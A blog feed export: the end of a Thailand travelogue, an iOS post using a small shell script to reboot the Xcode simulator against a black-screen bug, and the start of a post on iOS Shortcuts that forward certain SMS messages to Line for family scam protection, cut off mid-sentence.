}![](/assets/b7e7c0938985/1*dRzpenxFheOqEvXK33VYvQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }#### Stay for 2 Nights — [SHERATON HUA HIN RESORT &amp; SPA](https://www.marriott.com/en-us/hotels/hhqsi-sheraton-hua-hin-resort-and-spa/overview/){:target=\"_blank\"}![Source: [SHERATON HUA HIN RESORT &amp; SPA](https://www.marriott.com/en-us/hotels/hhqsi-sheraton-hua-hin-resort-and-spa/overview/){:target=\"_blank\"}](/assets/b7e7c0938985/1*VQNcJNArq7ujnKm8POxzIw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjM5OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Source: [SHERATON HUA HIN RESORT &amp; SPA](https://www.marriott.com/en-us/hotels/hhqsi-sheraton-hua-hin-resort-and-spa/overview/){:target=\"_blank\"}![](/assets/b7e7c0938985/1*-Xh7PmgGpEK06ki4gsXlrw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*_tX6g2M0pNmUz7HTEBAEWw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }I didn't take many photos of the hotel, just one shocking photo I took in the morning when I found a big centipede in my blanket.### Day 2#### [Santorini Park, Greek-style Town](https://maps.app.goo.gl/5e56XAK4en27bHbPA){:target=\"_blank\"} \\(Closed\\)[**【Hua Hin Seven Rock Attractions】Santorini Amusement Park: A Great Place for Photos in Thailand's Little Greece \\| BringYou**](https://www.bring-you.info/zh-tw/santorini-park){:target=\"_blank\"}[_On the way from Bangkok to Hua Hin, you must pass through the Seven Rock area, where there is a Greek-themed \"Santorini Amusement Park,\" a popular spot for Thai families to stroll on weekends. If you love taking photos, I highly recommend visiting this incredibly romantic park._ www\\.bring\\-you\\.info](https://www.bring-you.info/zh-tw/santorini-park){:target=\"_blank\"}It seems to be a small amusement park with Greek-style scenery.#### [Hua Hin Artist Village](https://maps.app.goo.gl/UcF7Wd82aHq4aGP86){:target=\"_blank\"}A well-known attraction, still open in 2024.![](/assets/b7e7c0938985/1*F0ArV4D6xV9P93xS-6bz0Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*RhWB5E_AxO7P-3LheSaG8A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*qg-pxwX-f19ABBjHR9phOQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }There are many paintings and artworks.#### Back to Sheraton Hotel to Enjoy Facilities and the Beach![](/assets/b7e7c0938985/1*NQiWTHzzUb2V-wEY3dMVZw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*zmdrp2Fr7qMcJWEwptDSOw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*RwptZZlRgtKrhw7phldDgw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*H5yG3lQbkb0dK8aBc8xKoQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*448HsB-gg4LjZx0qBo-Fkw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The hotel is in a villa style, with each room being a standalone unit. The swimming pool surrounds all the rooms, and there's a bar by the pool; the beach outside is undeveloped and desolate.![](/assets/b7e7c0938985/1*miAu_2XD5vl5BIJVlBVtHw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2NyI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After dinner, we went to a nearby night market.### Day 3#### [Maeklong Railway Market](https://maps.app.goo.gl/Jsbm5FFwYf2ArEW36){:target=\"_blank\"}It was too early, and everyone gave up on going.#### [Damnoen Saduak Floating Market](https://maps.app.goo.gl/tKSTmHgaHc4YCbpZ6){:target=\"_blank\"}&gt; 👉👉👉 **_These two attractions are not easily accessible; you can refer to the KKday itinerary:_**&gt; **_\\- [Bangkok Classic Day Tour | Maeklong Railway and Damnoen Saduak Floating Market | Departing from Bangkok](https://www.kkday.com/zh-tw/product/9912-maeklong-railway-damnoen-saduak-floating-market-day-tour-from-bangkok?cid=19365){:target=\"_blank\"}_**&gt; **_[\\-【Thailand】Bangkok Private Half-Day Tour | Maeklong Railway Market — Amphawa Floating Market — Amphawa Firefly River Cruise](https://www.kkday.com/zh-tw/product/21751-maeklong-railway-market-and-amphawa-floating-market-with-firefly-night-cruise-bangkok-thailand?cid=19365){:target=\"_blank\"}_**![](/assets/b7e7c0938985/1*c6univtvHdv6X6XhyPYMcQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*VH6qUdjI0mLxcedVESJTGg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }I remember it being quite thrilling and adventurous, even though the water was murky and had a smell.#### Head to Bangkok to Stay \\(2 Days\\) at [Marriott Queens Park Bangkok](https://maps.app.goo.gl/Bzq2EGFrsxsRTKpj9){:target=\"_blank\"}![](/assets/b7e7c0938985/1*FTTdVUQEj3Tu2uGwakKX4w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*cZHFyh86aBeu-1s0FTy0ZA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*FzT4qDMq1DKcLOqcg3fHRA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*8MxsGU4jZbDLdVpQFsFHEQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*oCMrr2lfEudPCsLjQE25qQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }#### [HEALTH LAND](https://www.healthlandspa.com/cn/home){:target=\"_blank\"} 2-Hour Full Body Thai Massage![](/assets/b7e7c0938985/1*qy7YBGcWTMfpItXtapHr9g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The guide specifically told the staff not to step on my back; I remember it being very high-end, but it hurt so much during the massage that I couldn't sleep ＸＤ.#### [River City Shopping Complex](https://maps.app.goo.gl/L3Pnv1BpLCpcGs7G7){:target=\"_blank\"}![](/assets/b7e7c0938985/1*7tYE57IoZUXg1gQhWuSa8g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Since we were going to the Chao Phraya Princess cruise + buffet dinner in the evening, we first stopped by the nearby shopping mall.#### Chao Phraya Princess Cruise Buffet Dinner&gt; 👉👉👉 **_Reservations are required in advance; you can refer to the KKday [Chao Phraya Princess River Cruise with Dinner Buffet](https://www.kkday.com/zh-tw/product/2567-chao-phraya-princess-river-cruise-with-dinner-buffet-thailand?cid=19365){:target=\"_blank\"}._**![](/assets/b7e7c0938985/1*41HlpbF7B8P7v5bdQ4QEkQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*EEELplqEfG3bLcGUoLAvRQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }I remember the food being decent, but the main highlight was the beautiful night view, where you could see the lights of the Bangkok [Riverside Night Market Ferris Wheel](https://maps.app.goo.gl/evFHo6ciFY4jswSt9){:target=\"_blank\"}.![](/assets/b7e7c0938985/1*5LGuEF_icqEUwOCb649QVw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*6pzhTRcjRh_b6Z4jOJH_fg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2NyI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After returning to the hotel, we went to the bar on the top floor of the Marriott for a drink; I just remember the night view being beautiful and the drinks being cheap.### Day 4 Free Day![](/assets/b7e7c0938985/1*qC8MvFxJkEvchvyF8ZTdHw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*NU2LiyNLR8lgf7phtPYKHg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }I only remember going shopping at the mall, Big C, and Central World.#### In the evening, we went to [Zoom Sky Bar at Anantara Sathorn Bangkok Hotel](https://www.kkday.com/zh-hk/product/105589-zoom-sky-bar-anantara-sathorn-bangkok-package?cid=19365){:target=\"_blank\"} for drinks.![](/assets/b7e7c0938985/1*MUQ_SKwc7AMVib-8elhHEQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*E0aQK0xnj1XNpLGoOZFmsQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }&gt; _This was the hotel I stayed at this time ＸＤ_### Day 5 Return Trip![](/assets/b7e7c0938985/1*X3wvH8aLHgatXQ0BQZmz_A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*SpSAMDAk7Pp7SSCrmCyBQQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }This concludes my memories from the 2018 employee trip. This time, returning to Bangkok for a fully independent trip made me more familiar with the city. Compared to my previous impressions, I feel it has become more prosperous, the food is better, and prices have increased since before.— — —#### [Common Room Booking Platform for Party Rooms / BBQ Venues for Hong Kong People](https://www.common-room.hk/c/partyroom){:target=\"_blank\"}![[Common Room](https://www.common-room.hk/c/boatp){:target=\"_blank\"}](/assets/b7e7c0938985/1*2FFkk0yG_a68oPnaNTe0vQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjQ3NyI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }[Common Room](https://www.common-room.hk/c/boatp){:target=\"_blank\"}Whether you're looking for a party room to celebrate or need a day rental hotel/inn for a short stay, you can use the Common Room platform to easily find your desired venue!You can now also book a boat party in Hong Kong.For friends traveling to Hong Kong who want to try different venue experiences, you can check it out now: [Common Room Booking Platform](https://www.common-room.hk/c/boatp){:target=\"_blank\"}.👉👉👉KKday Recommended Packages: Chao Phraya Princess River Cruise Dinner Buffet [**Bangkok Classic Day Tour Maeklong Railway and Damnoen Saduak Floating Market Departing from Bangkok**](https://www.kkday.com/zh-tw/product/9912-maeklong-railway-damnoen-saduak-floating-market-day-tour-from-bangkok?cid=19365){:target=”_blank”} [**Thailand: Half-Day Private Tour in Bangkok Maeklong Railway Market — Amphawa Floating Market — Amphawa Firefly River Cruise**](https://www.kkday.com/zh-tw/product/21751-maeklong-railway-market-and-amphawa-floating-market-with-firefly-night-cruise-bangkok-thailand?cid=19365){:target=”_blank”} King Power Mahanakhon SkyWalk Observation Deck Ticket Thailand Airport BKK Departure Meet and Greet Fast Track VIP Service [**Thailand SIM Card AIS 5G High-Speed Internet 8-Day Unlimited Data + Calls eSIM**](https://www.kkday.com/zh-tw/product/137037-ais-16-day-unlimited-data-esim-activate-before-may-3-2023-thailand?cid=19365){:target=”_blank”} [Thailand Airport Private Transfer Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) — Bangkok/Pattaya/Hua Hin City Hotels](https://www.kkday.com/zh-tw/product/3431-bkk-or-dmk-bangkok-private-transfer?cid=19365){:target=”_blank”} [Bangkok Airport Transfer Private Car from Bangkok City to Suvarnabhumi Airport (BKK)/Don Mueang Airport (DMK)](https://www.kkday.com/zh-tw/product/138989?cid=19365){:target=”_blank”} If you found this article helpful, feel free to use my promotional link to purchase KKday products and tours. I will earn a small commission, which helps me continue creating more travel content. Thank you.More Travelogues [Travelogue] 2024 San’in Region (Part 1) Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 San’in Region (Part 2) Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 Second Visit to Kyushu 9-Day Free Trip, Entering via Busan → Hakata Cruise [Travelogue] 2023 Kyushu 10-Day Solo Trip [Travelogue] 2023 Hiroshima Okayama 6-Day Free Trip [Travelogue] 9/11 Nagoya One-Day Flash Tour [Travelogue] 2023 Tokyo 5-Day Free Trip [Travelogue] 2023 Keihanshin 8-Day Free TripIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 1,361 Total Views Last Statistics Date: 2025-08-15 | 1,247 Views on Medium." }, { "title": "iOS TemporaryWorkaround for Black Launch Screen Bug After Several Launches", "url": "/posts/zrealm-dev/ios-temporaryworkaround-for-black-launch-screen-bug-after-several-launches-7584f643c0aa/", "categories": "ZRealm Dev.", "tags": "ios-app-development, xcode, simulator, bugs, apple", "date": "2024-08-20 23:32:04 +0800", "snippet": "[iOS] TemporaryWorkaround for Black Launch Screen Bug After Several Launches暫時 Workaround 解決 XCode Build &amp; Run App 卡黑屏問題Photo by Etienne Girardet問題不知道是 XCode 幾開始 (應該是 14?) 有些專案在 Build &amp; Run...", "content": "[iOS] TemporaryWorkaround for Black Launch Screen Bug After Several Launches暫時 Workaround 解決 XCode Build &amp; Run App 卡黑屏問題Photo by Etienne Girardet問題不知道是 XCode 幾開始 (應該是 14?) 有些專案在 Build &amp; Run 到模擬器多次之後會出現卡死在黑屏的問題，狀態卡在 Launching Application… 就沒有反映了；重新 Build &amp; Run 也沒用，需要手動砍掉整個模擬器讓他重啟才能修復。XCode 14.1: Stuck at “Launching Ap. . . | Apple Developer Forums Hello team, On Xcode 14.1, After building the project and when the simulator launches, it shows blank black screen… forums.developer.apple.com新專案、新的專案設定比較少遇到這問題；舊的專案比較常踩到，但舊專案礙於歷史悠久、設定複雜，查網路資料也查不到確定的 Root Caused，多半推測是 XCode Bug (or M1?)；但是這個問題實在太煩了，時常 Build &amp; Run 要看成果，結果一片黑暗，要整個重來過，每次大概要浪費個 1–2 分鐘，很中斷開發。Workaround這邊提供一個山不轉路轉的 Workaround，思路是既然避不開黑屏問題，並且黑屏不會出現在模擬器第一次啟動的 Build &amp; Run，所以我們只要確保每次 Build &amp; Run 都是全新重開過的模擬器即可。首先我們要取得你想要執行的模擬器的 Device UUID在 Terminal 執行：xcrun simctl list devices 找到你想用的模擬器裝置及它的 Device UUID 這邊以我的 iPhone 15 Pro (iOS 17.5) 為例Device UUID = 08C43D34–9BF0–42CF-B1B9–1E92838413CC再來我們新增一個 auto-reboot.sh Shell Script 檔案 cd /你想放此 Script 的目錄/ vi auto-reboot.sh貼上以下 Scirpt： 將 [Device UUID] 替代成你想用的模擬器 Device UUID 記得如果模擬器有更換要改這個腳本的 Device UUID，否則就無效了#!/bin/bash## Use the command below to find the Device UUID of the simulator you want to use:## xcrun simctl list devices# shutdown simulatorxcrun simctl shutdown [Device UUID]# reboot simulatorxcrun simctl boot [Device UUID] 腳本邏輯簡單粗暴，就是 關掉&amp;重啟 你想用的模擬器 ESC &amp; :wq!調整 auto-reboot.sh 執行權限：chmod +x auto-reboot.sh回 XCode 設定因為每個人習慣用的模擬器不同，因此我是設定在 XCode Behaviors，不會更動到專案的設定，也不會上到 git 影響團隊其他夥伴；但如果要簡單、全團隊同步也可以直接設定在 Scheme -&gt; Build -&gt; Pre-actions -&gt; sh /你想放此 Script 的目錄/auto-reboot.sh 。XCode Behaviors XCode -&gt; Behaviors -&gt; Edit Behaviors… 找到 Running 區塊 選擇 Completes 選項Completes 時機 = Stop or Rebuild 右邊勾選 Run 選擇 Choose Script… 選擇剛剛新建的 auto-reboot.sh 檔案位置 完成原理與結語Demo 是乾淨專案所以 Build 時間很短我們運用 XCode Behaviors 在 Completes (Stop or Rebuild) 的時機點重開模擬器，時間在開始 Build 之前，幾乎都能在 Build -&gt; Run 結束前完成重啟。如果狂按重開的確也有機會重啟太慢，導致 Run 找不到目標而出現另一種黑屏，不過這情況就不考慮了，至少這方案能在日常正常使用保持 Build &amp; Run App 正常執行。對速度的影響我覺得還好，因為 Build &amp; Run 本身也需要些時間，這些時間很夠模擬器重開了。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 121 Total Views Last Statistics Date: 2025-08-15 | 83 Views on Medium." }, { "title": "iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項", "url": "/posts/zrealm-dev/ios-%E6%8D%B7%E5%BE%91%E8%87%AA%E5%8B%95%E5%8C%96%E6%87%89%E7%94%A8%E5%A0%B4%E6%99%AF-%E8%87%AA%E5%8B%95%E8%BD%89%E7%99%BC%E7%B0%A1%E8%A8%8A%E8%88%87%E8%87%AA%E5%8B%95%E5%BB%BA%E7%AB%8B%E6%8F%90%E9%86%92%E5%BE%85%E8%BE%A6%E4%BA%8B%E9%A0%85-309d0302877b/", "categories": "ZRealm Dev.", "tags": "ios-app-development, automation, rpa-solutions, shortcuts, ios", "date": "2024-08-19 23:56:48 +0800", "snippet": "iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項iOS 使用 捷徑 Shortcut 簡單幾個步驟自動轉發特定簡訊到 Line 和自動創建包裹到貨領取與信用卡繳費提醒代辦事項Photo by Jakub Żerdzicki背景捷徑 Shortcut (舊稱 Workflow) 是 iOS 12 開始的新功能；能自行建立一系列工作一鍵執行和設定自動在背景觸發執行。除了 iOS...", "content": "iOS 捷徑自動化應用場景 — 自動轉發簡訊與自動建立提醒待辦事項iOS 使用 捷徑 Shortcut 簡單幾個步驟自動轉發特定簡訊到 Line 和自動創建包裹到貨領取與信用卡繳費提醒代辦事項Photo by Jakub Żerdzicki背景捷徑 Shortcut (舊稱 Workflow) 是 iOS 12 開始的新功能；能自行建立一系列工作一鍵執行和設定自動在背景觸發執行。除了 iOS 自帶 App 的捷徑功能，這幾年蘋果也將 Siri Shortcut / App Intents 開放給開發者，讓第三方 App 也能把部分功能放到捷徑中供使用者組合使用。自動執行條件的部分目前只限 iOS 自身或自家的 App，例如：特定時間、抵達、離開某個位置、感應到 NFC、收到訊息、電子郵件或連接上 Wi-Fi、電池電量、勿擾模式、偵測到聲音…等等蘋果自家的服務，不需要像早期轉發簡訊要越獄；捷徑功能，免越獄，免安裝奇怪的第三方 App。 網路上介紹捷徑如何使用、提供現成腳本的內容已經很多，本篇文章不多敘述。 iOS 的跨裝置訊息轉寄功能（設定 -&gt; 訊息 -&gt; 訊息轉寄）必須是同個 Apple ID 的裝置才行，因此我們要使用捷徑幫我們完成特定訊息轉寄。 本篇只介紹 3 個我覺得很實用方便又簡單的應用場景。場景 1 — 自動轉發簡訊在這個詐騙簡訊滿天飛的年代很怕家中長輩小孩收到詐騙簡訊不小心輸入資料被騙，或是長輩不懂收簡訊驗證這個帳號安全流程，需要遠端幫他收簡訊完成驗證；另外也怕小朋友用手機去做一些不允許的事。https://branch.taipower.com.tw/d112/xmdoc/cont?xsmsid=0M242581319225466606&amp;sid=0N209616847897374705效果設定條件如下： 當收到簡訊包含「http」時轉發訊息「內容」到 Line 給我 當收到簡訊包含「通知」時轉發訊息「內容」到 Line 給我 當收到簡訊包含「驗證碼」時轉發訊息「內容」到 Line 給我 當收到簡訊包含「認證碼」時轉發訊息「內容」到 Line 給我實測即使手機在未解鎖待命狀態也都能正確執行發送。設定方式1.安裝＆ 打開 捷徑 App2.切換到「自動化」頁籤，選擇右上角「+」，下滑找到「訊息」3. 設定訊息條件 「訊息包含」： http ( =有附網址的簡訊都會轉發 )多個關鍵字要個別建立多個捷徑。 「確認後執行」 改成 「立即執行」 點擊 「下一步」何時 — 其他設定： 「寄件人」：多個，但要加入到聯絡人 「訊息包含」、「寄件人」兩個條件需至少則一設定， 因此無法不設條件處理所有訊息4. 新增自動化操作 選擇 「新增空白的自動化操作」 如果想轉發到 Line 訊息則在搜尋匡輸入 「line」 搜尋 Line 提供的捷徑功能，找到 Line的 「傳送訊息」 選擇想傳送的目標 這邊如果只會出現最近四位對話對象或群組，如果沒有出現你要的目標，可以先回到 Line 上傳送幾則訊息給目標對象或群組，再回來看就會出現了。 對象選擇通訊錄電話號碼功能在 Line 傳送訊息無效。 同理，你也可以改用 